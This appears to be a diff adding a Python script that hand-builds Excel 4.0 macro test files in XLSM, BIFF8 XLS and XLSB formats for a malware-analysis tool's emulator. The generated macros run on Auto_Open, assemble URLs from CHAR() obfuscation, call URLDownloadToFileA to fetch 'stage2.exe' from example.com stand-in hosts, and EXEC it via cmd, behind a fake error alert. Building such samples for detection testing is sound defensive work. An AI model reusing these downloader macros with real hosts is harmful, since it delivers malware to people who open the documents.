@@ -1,0 +1,343 @@
+#!/usr/bin/env python3
+"""Makes samples/ace4's Excel 4.0 macro sheets, for tools/samples/gather and PLAN.md 4.7. Nothing here
+writes one, so each is written by hand from its format: .xlsm is zipped XML, .xls is BIFF8 records in a
+compound file (MS-XLS, MS-CFB), and .xlsb is BIFF12 records in a zip (MS-XLSB). Only the standard library
+is used and the bytes are the same on every run.
+
+    make-xlm <out dir>
+
+The URLs are example.com's. Each macro runs HALT() at its end, so none loops except xlm_loop's, whose
+WHILE never ends: it's what a pass's 30 s timeout is for.
+"""
+
+import io
+import struct
+import sys
+import zipfile
+from pathlib import Path
+
+CONTENT_TYPES = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+<Default Extension="xml" ContentType="application/xml"/>
+<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
+</Types>"""
+RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"""
+WORKBOOK_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/>
+</Relationships>"""
+AUTO_OPEN = '<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>'
+
+
+def workbook(names):
+    return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+<sheets><sheet name="Macro1" sheetId="1" r:id="rId1"/></sheets>
+{names}
+</workbook>"""
+
+
+def macrosheet(rows):
+    """rows are a cell's formula and its cached value, or None for one with neither."""
+    cells = "".join(
+        f'<row r="{i}"><c r="A{i}"><f>{formula}</f>{f"<v>{value}</v>" if value else ""}</c></row>\n'
+        for i, (formula, value) in enumerate(rows, 1)
+    )
+    return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
+<sheetData>
+{cells}</sheetData>
+</xm:macrosheet>"""
+
+
+def make_zip(parts):
+    out = io.BytesIO()
+    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
+        for name, data in parts:
+            z.writestr(zipfile.ZipInfo(name, (2020, 1, 1, 0, 0, 0)), data)
+    return out.getvalue()
+
+
+def xlsm(rows, names=AUTO_OPEN):
+    return make_zip([
+        ("[Content_Types].xml", CONTENT_TYPES),
+        ("_rels/.rels", RELS),
+        ("xl/workbook.xml", workbook(names)),
+        ("xl/_rels/workbook.xml.rels", WORKBOOK_RELS),
+        ("xl/macrosheets/sheet1.xml", macrosheet(rows)),
+    ])
+
+
+def chars(text):
+    """text as CHAR()s joined by &, which is what makes an emulator earn its keep."""
+    return "&amp;".join(f"CHAR({ord(c)})" for c in text)
+
+
+# Builds the URL in a cell with FORMULA, downloads it and runs it. The emulated output has the URL; the
+# extracted cells don't, except in A7, which a cell's own text holds. é and 日本 are in the output.
+OBFUSCATED_ROWS = [
+    (f'FORMULA({chars("http://xlm-built.example.com/stage2.exe")},A12)', None),
+    ('FORMULA("c:\\users\\public\\é日本.exe",A13)', None),
+    ('CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,A12,A13,0,0)', None),
+    ('EXEC("cmd /c "&amp;A13)', None),
+    ('ALERT("The workbook cannot be opened",2)', None),
+    ('IF(1=2,GOTO(A11),)', None),
+    ('CALL("wininet","InternetOpenUrlA","JJCJJJ",0,"https://xlm-plain.example.com/a?b=1",0,0,0)', None),
+    # a URL as it comes in a macro, spaces and all, and hardly one at all
+    ('CALL("kernel32","WinExec","JCJ","HTTP://Upper.example.com/a b",0)', None),
+    ('CALL("kernel32","WinExec","JCJ","http://%",0)', None),
+    ('HALT()', None),
+    ('EXEC("never.exe")', None),
+    ('0', None),
+    ('0', None),
+]
+
+# Reads a cell a FORMULA couldn't fill, which is where the command opens its shell to ask what it holds.
+UNKNOWN_CELL_ROWS = [
+    ('FORMULA(EXEC("x"),Z5)', None),
+    ('Z5', None),
+    ('CALL("kernel32","WinExec","JCJ","http://xlm-shell.example.com/after",0)', None),
+    ('HALT()', None),
+]
+
+# A WHILE whose NEXT never comes out, with a new line of output on every turn.
+LOOP_ROWS = [
+    ('WHILE(1=1)', None),
+    ('SET.VALUE(A5,A5+1)', None),
+    ('NEXT()', None),
+    ('HALT()', None),
+    ('0', None),
+]
+
+
+def biff(record, data=b""):
+    return struct.pack("<HH", record, len(data)) + data
+
+
+def biff_str(text):
+    return struct.pack("<BB", len(text), 0) + text.encode("latin-1")
+
+
+def ptg_str(text):
+    return b"\x17" + biff_str(text)
+
+
+def ptg_func_var(function, argc):
+    return b"\x22" + struct.pack("<BH", argc, function)
+
+
+def ptg_ref(row, column):
+    """A value reference to an absolute cell."""
+    return b"\x44" + struct.pack("<HH", row, column)
+
+
+HALT, EXEC, CALL, FORMULA = 54, 110, 150, 32864
+FORMULA_CHAR = 111
+
+
+def char_join(text):
+    tokens = b""
+    for i, c in enumerate(text):
+        tokens += b"\x1e" + struct.pack("<H", ord(c)) + b"\x21" + struct.pack("<H", FORMULA_CHAR)
+        if i:
+            tokens += b"\x08"
+    return tokens
+
+
+def biff_cell(row, tokens):
+    return biff(
+        0x0006,
+        struct.pack("<HHH", row, 0, 15) + struct.pack("<dHI", 0.0, 0, 0)
+        + struct.pack("<H", len(tokens)) + tokens,
+    )
+
+
+def biff8_workbook():
+    """A workbook stream: a globals substream naming one Excel 4.0 macro sheet with Auto_Open on its
+    A1, and that sheet."""
+    bof_globals = biff(0x0809, struct.pack("<HHHHII", 0x0600, 0x0005, 0x0DBB, 0x07CC, 0, 0x0206))
+    font = biff(0x0031, struct.pack("<HHHHHBBBBBB", 200, 0, 0x7FFF, 400, 0, 0, 0, 0, 0, 0, 0) + biff_str_unicode("Arial"))
+    xf = biff(0x00E0, struct.pack("<HHHBBBBIIH", 0, 0, 0xFFF5, 0x20, 0, 0, 0, 0, 0, 0))
+    style_xfs = xf * 15 + biff(0x00E0, struct.pack("<HHHBBBBIIH", 0, 0, 0x0001, 0x20, 0, 0, 0, 0, 0, 0))
+    supbook = biff(0x01AE, struct.pack("<HH", 1, 0x0401))
+    externsheet = biff(0x0017, struct.pack("<HHHH", 1, 0, 0, 0))
+    auto_open = b"\x3a" + struct.pack("<HHH", 0, 0, 0)
+    name = biff(
+        0x0018,
+        struct.pack("<HBBHHHBBBB", 0x0020, 0, 1, len(auto_open), 0, 1, 0, 0, 0, 0) + b"\0\x01" + auto_open,
+    )
+    eof = biff(0x000A)
+    sheet_name = biff_str("Macro1")
+
+    def boundsheet(offset):
+        # the high byte: 1 is an Excel 4.0 macro sheet
+        return biff(0x0085, struct.pack("<IBB", offset, 0, 1) + sheet_name)
+
+    before = bof_globals + font + style_xfs
+    after = supbook + externsheet + name + eof
+    offset = len(before) + len(boundsheet(0)) + len(after)
+
+    target, path = 9, 10
+    cells = [
+        (0, char_join("http://xlm-biff8.example.com/stage2.exe") + ptg_ref(target, 0) + ptg_func_var(FORMULA, 2)),
+        (1, ptg_str("c:\\users\\public\\b8.exe") + ptg_ref(path, 0) + ptg_func_var(FORMULA, 2)),
+        (2, ptg_str("urlmon") + ptg_str("URLDownloadToFileA") + ptg_str("JJCCJJ") + b"\x1e\0\0" + ptg_ref(target, 0)
+            + ptg_ref(path, 0) + b"\x1e\0\0" + b"\x1e\0\0" + ptg_func_var(CALL, 8)),
+        (3, ptg_str("cmd /c start b8") + ptg_func_var(EXEC, 1)),
+        (4, ptg_func_var(HALT, 0)),
+    ]
+    sheet = (
+        biff(0x0809, struct.pack("<HHHHII", 0x0600, 0x0040, 0x0DBB, 0x07CC, 0, 0x0206))
+        + biff(0x0200, struct.pack("<IIHHH", 0, 12, 0, 1, 0))
+        + b"".join(biff_cell(row, tokens) for row, tokens in cells)
+        + biff(0x000A)
+    )
+    return before + boundsheet(offset) + after + sheet
+
+
+def biff_str_unicode(text):
+    return struct.pack("<BB", len(text), 0) + text.encode("latin-1")
+
+
+def compound_file(stream_name, data):
+    """One stream in an MS-CFB version 3 file, past the mini stream's 4096 bytes."""
+    data = data.ljust(max(4096, len(data)), b"\0")
+    data = data.ljust((len(data) + 511) // 512 * 512, b"\0")
+    sectors = len(data) // 512
+    free, end, fat_sector = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD
+    fat = [fat_sector, end] + [i + 3 for i in range(sectors - 1)] + [end]
+    if len(fat) > 128:
+        raise ValueError("a stream too long for one FAT sector")
+    fat = struct.pack(f"<{len(fat)}I", *fat).ljust(512, b"\xff")
+
+    def entry(name, kind, child, start, size, clsid=b"\0" * 16):
+        encoded = name.encode("utf-16-le") + b"\0\0"
+        return (
+            encoded.ljust(64, b"\0") + struct.pack("<HBBIII", len(encoded), kind, 1, free, free, child) + clsid
+            + struct.pack("<IQQ", 0, 0, 0) + struct.pack("<IQ", start, size)
+        )
+
+    excel8 = bytes.fromhex("20080200000000000000000000000046")
+    excel8 = excel8[:8] + b"\xc0" + excel8[9:]
+    directory = (
+        entry("Root Entry", 5, 1, end, 0, excel8)
+        + entry(stream_name, 2, free, 2, len(data))
+    ).ljust(512, b"\0")
+    # an unused entry reads as empty
+    directory = directory[:256] + b"\0" * 64 + directory[320:]
+    header = (
+        bytes.fromhex("D0CF11E0A1B11AE1") + b"\0" * 16 + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6) + b"\0" * 6
+        + struct.pack("<IIIII", 0, 1, 1, 0, 0x1000) + struct.pack("<IIII", end, 0, end, 0)
+        + struct.pack("<I", 0) + b"\xff" * (109 * 4 - 4)
+    )
+    return header + fat + directory + data
+
+
+def b12_length(value):
+    out = b""
+    while True:
+        byte = value & 0x7F
+        value >>= 7
+        if value:
+            out += bytes([byte | 0x80])
+        else:
+            return out + bytes([byte])
+
+
+def b12(record, data=b""):
+    """A BIFF12 record: its type and length, each in the format's 7-bit groups."""
+    if record < 0x80:
+        kind = bytes([record])
+    else:
+        kind = bytes([(record & 0x7F) | 0x80, record >> 7])
+    return kind + b12_length(len(data)) + data
+
+
+def b12_str(text):
+    encoded = text.encode("utf-16-le")
+    return struct.pack("<I", len(text)) + encoded
+
+
+def b12_ptg_str(text):
+    return b"\x17" + struct.pack("<H", len(text)) + text.encode("utf-16-le")
+
+
+def b12_cell(row, tokens):
+    """A row and a formula cell in column A."""
+    header = b12(0, struct.pack("<IIHBBI", row, 0, 0, 0, 0, 0))
+    return header + b12(8, struct.pack("<II", 0, 0) + b12_str("") + struct.pack("<HI", 0, len(tokens)) + tokens)
+
+
+def xlsb():
+    target = 9
+    cells = [
+        (0, char_join("http://xlm-xlsb.example.com/stage2.exe") + b"\x44" + struct.pack("<IH", target, 0xC000)
+            + ptg_func_var(FORMULA, 2)),
+        (1, b12_ptg_str("urlmon") + b12_ptg_str("URLDownloadToFileA") + b12_ptg_str("JJCCJJ") + b"\x1e\0\0"
+            + b"\x44" + struct.pack("<IH", target, 0xC000) + b12_ptg_str("c:\\users\\public\\xb.exe") + b"\x1e\0\0"
+            + b"\x1e\0\0" + ptg_func_var(CALL, 8)),
+        (2, ptg_func_var(HALT, 0)),
+    ]
+    sheet = (
+        b12(129) + b12(145) + b"".join(b12_cell(row, tokens) for row, tokens in cells) + b12(146) + b12(130)
+    )
+    auto_open = b"\x3a" + struct.pack("<HIH", 0, 0, 0)
+    book = (
+        b12(131)
+        + b12(143) + b12(156, struct.pack("<II", 0, 1) + b12_str("rId1") + b12_str("Macro1")) + b12(144)
+        + b12(353) + b12(357) + b12(362, struct.pack("<Iiii", 1, 0, 0, 0))
+        + b12(39, struct.pack("<IBI", 0, 0, 0xFFFFFFFF) + b12_str("Auto_Open") + struct.pack("<I", len(auto_open)) + auto_open)
+        + b12(132)
+    )
+    types = CONTENT_TYPES.replace("/xl/workbook.xml", "/xl/workbook.bin").replace(
+        "/xl/macrosheets/sheet1.xml", "/xl/macrosheets/sheet1.bin"
+    ).replace('<Default Extension="xml"', '<Default Extension="bin" ContentType="application/vnd.ms-excel.sheet.binary"/>\n<Default Extension="xml"')
+    return make_zip([
+        ("[Content_Types].xml", types),
+        ("_rels/.rels", RELS.replace("xl/workbook.xml", "xl/workbook.bin")),
+        ("xl/workbook.bin", book),
+        ("xl/_rels/workbook.bin.rels", WORKBOOK_RELS.replace("sheet1.xml", "sheet1.bin")),
+        ("xl/macrosheets/sheet1.bin", sheet),
+    ])
+
+
+def make(directory):
+    """Each file, by the name the manifest knows it by."""
+    files = {
+        # what the emulator exists for: the URL is only there once the macro has run
+        "xlm_obfuscated.xlsm": xlsm(OBFUSCATED_ROWS),
+        # no Auto_Open, so the command asks where to start, on a stdin at its end
+        "xlm_no_entry.xlsm": xlsm(OBFUSCATED_ROWS, names=""),
+        # a cell nothing filled, so the command opens its shell, on a stdin at its end
+        "xlm_unknown_cell.xlsm": xlsm(UNKNOWN_CELL_ROWS),
+        # a sheet with no cells: xlm4:no_cells
+        "xlm_no_cells.xlsm": xlsm([]),
+        # a workbook that won't load: xlm4:error
+        "xlm_broken.xlsm": make_zip([
+            ("[Content_Types].xml", CONTENT_TYPES),
+            ("_rels/.rels", RELS),
+            ("xl/workbook.xml", "this isn't XML"),
+            ("xl/_rels/workbook.xml.rels", WORKBOOK_RELS),
+            ("xl/macrosheets/sheet1.xml", "nor this"),
+        ]),
+        "xlm_biff8.xls": compound_file("Workbook", biff8_workbook()),
+        "xlm_xlsb.xlsb": xlsb(),
+        # none of the module's own rules match, but tools/ace3/trees/signatures' XLM_Macrosheet_NonBin
+        # matches a file in it, so the module analyzes both, as for any of its yara_rule_names
+        "xlm_yara_rule.zip": make_zip([("note.txt", "ACE4-XLM-RULE-MARKER-9d2e\n")]),
+        # a pass's timeout, in both systems
+        "xlm_loop.xlsm": xlsm(LOOP_ROWS),
+    }
+    directory.mkdir(parents=True, exist_ok=True)
+    for name, data in files.items():
+        (directory / name).write_bytes(data)
+    return list(files)
+
+
+if __name__ == "__main__":
+    print("\n".join(make(Path(sys.argv[1]))))
